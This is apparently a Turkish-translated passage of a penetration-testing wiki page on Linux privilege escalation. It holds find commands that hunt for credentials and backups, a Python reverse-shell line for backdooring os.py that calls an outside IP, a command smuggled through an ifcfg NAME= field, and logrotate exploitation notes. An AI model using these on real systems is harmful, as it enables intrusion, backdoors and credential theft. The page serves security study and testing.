Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Tuhaf Konum/Owned dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakikada değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyalar
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH içindeki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Passwords içeren bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin; **passwords içerebilecek birkaç olası dosyayı** arar.\
**Başka ilginç bir araç** olarak kullanabileceğiniz: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — yerel bir bilgisayarda saklanan çok sayıda passwords elde etmek için kullanılan açık kaynaklı bir uygulamadır (Windows, Linux & Mac).

### Logs

Logs'ları okuyabiliyorsanız, içlerinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar garipse, muhtemelen o kadar ilginç olacaktır (probably).\
Ayrıca, bazı **bad** yapılandırılmış (backdoored?) **audit logs** size, bu gönderide açıklandığı gibi audit logs içine **record passwords** yapma imkanı verebilir: https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/.
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Logları **okumak için** [**adm**](interesting-groups-linux-pe/index.html#adm-group) grubu çok yardımcı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Dosya isimlerinde veya içeriklerinde "**password**" kelimesini içeren dosyaları da kontrol etmelisiniz; ayrıca loglarda IP'leri ve e-postaları veya hash'ler için regexp'leri de kontrol edin.\
Burada bunların tamamının nasıl yapılacağını tek tek listelemeyeceğim ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)'in yaptığı son kontrolleri inceleyebilirsiniz.

## Writable files

### Python library hijacking

Eğer bir python scriptinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** ya da **python kütüphanelerini değiştirebiliyorsanız**, OS library'yi değiştirip arka kapı yerleştirebilirsiniz (python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

Kütüphaneyi **backdoor the library** yapmak için os.py kütüphanesinin sonuna aşağıdaki satırı ekleyin (IP ve PORT'u değiştirin):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate`'deki bir zafiyet, bir log dosyasına veya üst dizinlerine **yazma izinlerine** sahip kullanıcıların potansiyel olarak ayrıcalık yükseltmesine imkan verir. Bunun nedeni, sıklıkla **root** olarak çalışan `logrotate`'in özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde rastgele dosyaları çalıştıracak şekilde manipüle edilebilmesidir. İzinleri yalnızca _/var/log_ içinde değil, log rotasyonunun uygulandığı tüm dizinlerde kontrol etmek önemlidir.

> [!TIP]
> Bu zafiyet `logrotate` sürüm `3.18.0` ve daha eski sürümleri etkiler

Zafiyetle ilgili daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu zafiyeti [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu zafiyet [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** ile çok benzerdir; bu yüzden logs'u değiştirebildiğinizi tespit ettiğiniz her durumda, bu logs'ları kimlerin yönettiğini kontrol edin ve logs'ları symlink ile değiştirerek ayrıcalık yükseltmesi yapıp yapamayacağınızı inceleyin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Zafiyet referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Herhangi bir sebeple bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine `ifcf-<whatever>` adlı bir script **yazabiliyor** veya mevcut bir scripti **düzenleyebiliyorsa**, sisteminiz **pwned** olur.

Network scriptleri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tamamen .INI dosyalarına benzer görünürler. Ancak Linux'ta Network Manager (dispatcher.d) tarafından \~sourced\~ edilirler.

Benim durumumda, bu network scriptlerinde `NAME=` ile verilen değer doğru şekilde işlenmiyor. İsimde **boşluk olduğunda sistem boşluktan sonraki kısmı çalıştırmaya çalışıyor**. Bu da **ilk boşluktan sonraki her şeyin root olarak çalıştırıldığı** anlamına geliyor.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ile /bin/id arasındaki boşluğa dikkat edin_)

### **init, init.d, systemd, and rc.d**

Dizin `/etc/init.d`, System V init (SysVinit) için **betikler** barındırır; bu, **klasik Linux servis yönetim sistemi**'dir. Servisleri `start`, `stop`, `restart` ve bazen `reload` etmek için betikler içerir. Bunlar doğrudan veya `/etc/rc?.d/` içinde bulunan sembolik linkler aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif bir yol `/etc/rc.d/init.d`'dir.

Öte yandan, `/etc/init` **Upstart** ile ilişkilidir; Ubuntu tarafından getirilen daha yeni bir **service management** yaklaşımı olup servis yönetimi görevleri için yapılandırma dosyaları kullanır. Upstart'e geçişe rağmen, Upstart'teki uyumluluk katmanı nedeniyle SysVinit betikleri hâlâ Upstart yapılandırmalarıyla birlikte kullanılmaktadır.

**systemd** modern bir initialization ve servis yöneticisi olarak öne çıkar; talebe bağlı daemon başlatma, automount yönetimi ve sistem durumunun anlık görüntülerini alma gibi gelişmiş özellikler sunar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` dizinlerine ayırarak sistem yönetimini sadeleştirir.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks genellikle privileged kernel functionality'yi userspace bir manager'a açmak için bir syscall'e hook koyarlar. Zayıf manager doğrulaması (örn. FD-order'a dayanan imza kontrolleri veya zayıf parola şemaları), yerel bir uygulamanın manager'ı taklit ederek zaten-root'lanmış cihazlarda root'a yükselmesine olanak tanıyabilir. Daha fazla bilgi ve exploitation detayları için:

{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux yerel privilege escalation vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve MAC'te kernel zafiyetlerini enumerate eder [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
